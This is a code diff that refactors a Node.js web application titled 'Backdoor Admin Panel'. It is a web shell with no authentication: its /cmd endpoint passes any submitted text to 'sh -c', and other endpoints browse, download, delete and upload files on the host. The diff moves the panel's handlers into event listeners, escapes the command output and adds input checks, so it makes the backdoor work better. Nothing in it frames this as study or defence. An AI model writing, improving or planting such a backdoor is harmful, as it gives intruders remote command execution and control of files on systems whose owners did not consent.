@@ -44,135 +44,179 @@ const MAIN_HTML = `
 <body>
     <div id="main" style="display: block;">
         <h1>Backdoor Admin Panel</h1>
-        <button onclick="showTab('terminal')">Terminal</button>
-        <button onclick="showTab('files')">Files</button>
+        <button id="btn-terminal">Terminal</button>
+        <button id="btn-files">Files</button>
        
         <div id="terminal" class="tab active">
             <h2>Interactive Terminal</h2>
             <div id="output"></div>
-            <input type="text" id="cmd" placeholder="Enter command..." onkeypress="if(event.key==='Enter') runCmd()">
-            <button onclick="runCmd()">Run</button>
+            <input type="text" id="cmd" placeholder="Enter command...">
+            <button id="btn-run">Run</button>
         </div>
        
         <div id="files" class="tab">
             <h2>File Browser</h2>
             <p>Current Dir: <span id="currDir"></span></p>
             <input type="text" id="newDir" placeholder="New dir name">
-            <button onclick="mkDir()">Create Dir</button>
+            <button id="btn-mkdir">Create Dir</button>
             <input type="file" id="upload" multiple>
-            <button onclick="uploadFiles()">Upload</button>
+            <button id="btn-upload">Upload</button>
             <div id="fileList"></div>
         </div>
     </div>
     <script>
-        // No session needed
-        
-        function showTab(tab) {
-            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-            document.getElementById(tab).classList.add('active');
-            if (tab === 'files') updateFiles();
-        }
-       
-        function runCmd() {
-            const cmd = document.getElementById('cmd').value;
-            if (!cmd) return;
-            const out = document.getElementById('output');
-            out.innerHTML += '> ' + cmd + '\\n';
-            fetch('/cmd', { 
-                method: 'POST', 
-                headers: {'Content-Type': 'application/json'}, 
-                body: JSON.stringify({cmd}) 
-            })
-            .then(r => r.text())
-            .then(data => {
-                out.innerHTML += data.replace(/\\n/g, '<br>') + '<br>';
-                out.scrollTop = out.scrollHeight;
-            })
-            .catch(err => {
-                out.innerHTML += 'Error: ' + err.message + '<br>';
-                out.scrollTop = out.scrollHeight;
+        // Wait for DOM ready
+        document.addEventListener('DOMContentLoaded', function() {
+            let sessionId = null; // Not used now, but kept for future
+            
+            // Event listeners for static buttons
+            document.getElementById('btn-terminal').addEventListener('click', () => showTab('terminal'));
+            document.getElementById('btn-files').addEventListener('click', () => showTab('files'));
+            document.getElementById('btn-run').addEventListener('click', runCmd);
+            document.getElementById('btn-mkdir').addEventListener('click', mkDir);
+            document.getElementById('btn-upload').addEventListener('click', uploadFiles);
+            
+            // Enter key for cmd input
+            document.getElementById('cmd').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') runCmd();
             });
-            document.getElementById('cmd').value = '';
-        }
-       
-        function updateFiles() {
-            fetch('/files')
-            .then(r => r.json())
-            .then(data => {
-                document.getElementById('currDir').textContent = data.cwd;
-                const list = document.getElementById('fileList');
-                list.innerHTML = '<h3>Files:</h3>';
-                data.files.forEach(f => {
-                    const div = document.createElement('div');
-                    div.className = 'file';
-                    if (f.isDir) {
-                        div.innerHTML = '<span class="dir">📁</span> <a href="#" onclick="cd(\\'\\' + f.name + '\\')" class="file-link">' + f.name + '</a>';
-                    } else {
-                        const fullPath = clientPathJoin(data.cwd, f.name);
-                        div.innerHTML = '<span>📄</span> <a href="/download?file=' + encodeURIComponent(fullPath) + '" class="file-link">' + f.name + '</a> <button onclick="rm(\\'\\' + f.name + '\\')">Delete</button>';
-                    }
-                    list.appendChild(div);
+            
+            function showTab(tab) {
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                document.getElementById(tab).classList.add('active');
+                if (tab === 'files') updateFiles();
+            }
+           
+            function runCmd() {
+                const cmdInput = document.getElementById('cmd');
+                const cmd = cmdInput.value;
+                if (!cmd) return;
+                const out = document.getElementById('output');
+                out.innerHTML += '> ' + cmd + '<br>';
+                fetch('/cmd', { 
+                    method: 'POST', 
+                    headers: {'Content-Type': 'application/json'}, 
+                    body: JSON.stringify({cmd}) 
+                })
+                .then(r => r.text())
+                .then(data => {
+                    // Replace newlines with <br> and escape HTML if needed
+                    const escapedData = data.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+                    out.innerHTML += escapedData.replace(/\n/g, '<br>') + '<br>';
+                    out.scrollTop = out.scrollHeight;
+                })
+                .catch(err => {
+                    out.innerHTML += 'Error: ' + err.message + '<br>';
+                    out.scrollTop = out.scrollHeight;
                 });
-            })
-            .catch(err => console.error('Update files error:', err));
-        }
-       
-        function cd(dir) {
-            fetch('/cd', { 
-                method: 'POST', 
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({dir}) 
-            })
-            .then(() => updateFiles());
-        }
-       
-        function mkDir() {
-            const name = document.getElementById('newDir').value;
-            if (!name) return;
-            fetch('/mkdir', { 
-                method: 'POST', 
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({name}) 
-            })
-            .then(() => { 
-                updateFiles(); 
-                document.getElementById('newDir').value = ''; 
-            });
-        }
-       
-        function uploadFiles() {
-            const input = document.getElementById('upload');
-            if (input.files.length === 0) return;
-            const formData = new FormData();
-            Array.from(input.files).forEach(file => formData.append('files', file));
-            fetch('/upload', { 
-                method: 'POST', 
-                body: formData
-            })
-            .then(r => r.text())
-            .then(() => { 
-                updateFiles(); 
-                input.value = ''; 
-            })
-            .catch(err => alert('Upload error: ' + err.message));
-        }
-       
-        function rm(file) {
-            if (!confirm('Delete ' + file + '?')) return;
-            fetch('/rm', { 
-                method: 'POST', 
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({file}) 
-            })
-            .then(() => updateFiles());
-        }
-       
-        // Client-side path join
-        function clientPathJoin(p1, p2) { 
-            return p1.endsWith('/') ? p1 + p2 : p1 + '/' + p2; 
-        }
-        
-        // Auto-load files on start if needed, but terminal is default
+                cmdInput.value = '';
+            }
+           
+            function updateFiles() {
+                fetch('/files')
+                .then(r => r.json())
+                .then(data => {
+                    document.getElementById('currDir').textContent = data.cwd;
+                    const list = document.getElementById('fileList');
+                    list.innerHTML = '<h3>Files:</h3>';
+                    data.files.forEach(f => {
+                        const div = document.createElement('div');
+                        div.className = 'file';
+                        if (f.isDir) {
+                            // Use data attribute and event delegation for cd
+                            const a = document.createElement('a');
+                            a.href = '#';
+                            a.className = 'file-link dir';
+                            a.textContent = '📁 ' + f.name;
+                            a.dataset.action = 'cd';
+                            a.dataset.dir = f.name;
+                            div.appendChild(a);
+                        } else {
+                            const fullPath = clientPathJoin(data.cwd, f.name);
+                            const a = document.createElement('a');
+                            a.href = '/download?file=' + encodeURIComponent(fullPath);
+                            a.className = 'file-link';
+                            a.textContent = '📄 ' + f.name;
+                            a.target = '_blank'; // Open download in new tab
+                            div.appendChild(a);
+                            
+                            const btn = document.createElement('button');
+                            btn.textContent = 'Delete';
+                            btn.dataset.action = 'rm';
+                            btn.dataset.file = f.name;
+                            div.appendChild(btn);
+                        }
+                        list.appendChild(div);
+                    });
+                    
+                    // Add event delegation for dynamic elements
+                    list.addEventListener('click', function(e) {
+                        if (e.target.dataset.action === 'cd') {
+                            cd(e.target.dataset.dir);
+                        } else if (e.target.dataset.action === 'rm') {
+                            rm(e.target.dataset.file);
+                        }
+                    });
+                })
+                .catch(err => console.error('Update files error:', err));
+            }
+           
+            function cd(dir) {
+                fetch('/cd', { 
+                    method: 'POST', 
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({dir}) 
+                })
+                .then(() => updateFiles());
+            }
+           
+            function mkDir() {
+                const newDirInput = document.getElementById('newDir');
+                const name = newDirInput.value;
+                if (!name) return;
+                fetch('/mkdir', { 
+                    method: 'POST', 
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({name}) 
+                })
+                .then(() => { 
+                    updateFiles(); 
+                    newDirInput.value = ''; 
+                });
+            }
+           
+            function uploadFiles() {
+                const input = document.getElementById('upload');
+                if (input.files.length === 0) return;
+                const formData = new FormData();
+                Array.from(input.files).forEach(file => formData.append('files', file));
+                fetch('/upload', { 
+                    method: 'POST', 
+                    body: formData
+                })
+                .then(r => r.text())
+                .then(() => { 
+                    updateFiles(); 
+                    input.value = ''; 
+                })
+                .catch(err => alert('Upload error: ' + err.message));
+            }
+           
+            function rm(file) {
+                if (!confirm('Delete ' + file + '?')) return;
+                fetch('/rm', { 
+                    method: 'POST', 
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({file}) 
+                })
+                .then(() => updateFiles());
+            }
+           
+            // Client-side path join
+            function clientPathJoin(p1, p2) { 
+                return p1.endsWith('/') ? p1 + p2 : p1 + '/' + p2; 
+            }
+        });
     </script>
 </body>
 </html>`;
@@ -193,6 +237,11 @@ const server = http.createServer((req, res) => {
         req.on('end', () => {
             try {
                 const { cmd } = JSON.parse(body);
+                if (!cmd) {
+                    res.writeHead(400);
+                    res.end('No command provided');
+                    return;
+                }
                 const sh = spawn('sh', ['-c', cmd], { cwd: currentDir });
                 let output = '';
                 sh.stdout.on('data', data => output += data.toString());
@@ -229,6 +278,11 @@ const server = http.createServer((req, res) => {
         req.on('end', () => {
             try {
                 const { dir } = JSON.parse(body);
+                if (!dir) {
+                    res.writeHead(400);
+                    res.end();
+                    return;
+                }
                 const newDir = path.resolve(currentDir, dir);
                 if (fs.existsSync(newDir) && fs.statSync(newDir).isDirectory()) {
                     currentDir = newDir;
@@ -249,7 +303,12 @@ const server = http.createServer((req, res) => {
         req.on('end', () => {
             try {
                 const { name } = JSON.parse(body);
-                fs.mkdir(path.join(currentDir, name), err => {
+                if (!name) {
+                    res.writeHead(400);
+                    res.end();
+                    return;
+                }
+                fs.mkdir(path.join(currentDir, name), { recursive: true }, err => {
                     res.writeHead(err ? 500 : 200);
                     res.end();
                 });
@@ -267,6 +326,11 @@ const server = http.createServer((req, res) => {
         req.on('end', () => {
             try {
                 const { file } = JSON.parse(body);
+                if (!file) {
+                    res.writeHead(400);
+                    res.end();
+                    return;
+                }
                 fs.unlink(path.join(currentDir, file), err => {
                     res.writeHead(err ? 500 : 200);
                     res.end();
@@ -301,7 +365,6 @@ const server = http.createServer((req, res) => {
    
     if (req.url === '/upload' && req.method === 'POST') {
         // Stub: Implement with formidable for full support
-        // For now, just acknowledge
         res.writeHead(200, { 'Content-Type': 'text/plain' });
         res.end('Upload endpoint ready but parsing not implemented. Install formidable for full support.');
         return;
